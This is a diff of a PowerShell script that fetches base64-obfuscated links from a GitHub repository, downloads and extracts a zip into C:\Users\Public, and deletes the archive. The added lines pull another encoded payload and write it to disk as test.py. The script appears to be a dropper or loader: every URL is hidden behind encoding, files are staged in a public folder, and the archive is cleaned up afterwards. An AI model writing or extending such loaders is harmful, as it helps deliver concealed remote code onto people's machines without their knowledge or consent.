@@ -1,4 +1,4 @@
-## VERSION 1.0
+## VERSION 1.1
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
@@ -8,6 +8,9 @@ $orConfigPath = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolon
 $deConfigPath = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orConfigPath))
 $tLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/link" | Select-Object -ExpandProperty Content
 $oLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tLink))
+$orTestLink = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/test" | Select-Object -ExpandProperty Content
+$deTestLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($orTestLink))
+$testFilePath = "$extract\test.py"
 
 
 # Downloads from GitHub
@@ -15,10 +18,19 @@ function download {
     if (Test-Path $extract) {
         "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
     } else {
+        "Downloading zip..." | Out-File -FilePath $log
         Invoke-WebRequest -Uri $oLink -OutFile $zip
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $extract)
+        "Cleaning zip" | Out-File -FilePath $log
         Remove-Item $zip
+    }
+
+    if (Test-Path $testFilePath) {
+        "Already downloaded. Skipping..." | Out-File -Append -FilePath $log
+    } else {
+        "Downloading test.py..." | Out-File -FilePath $log
+        $deTestLink | Out-File -FilePath $testFilePath -Encoding utf8
     }
 }
 
@@ -70,7 +82,6 @@ function main {
     }
     Start-Sleep -Seconds 5
 }
-
 
 download
 writeConfig
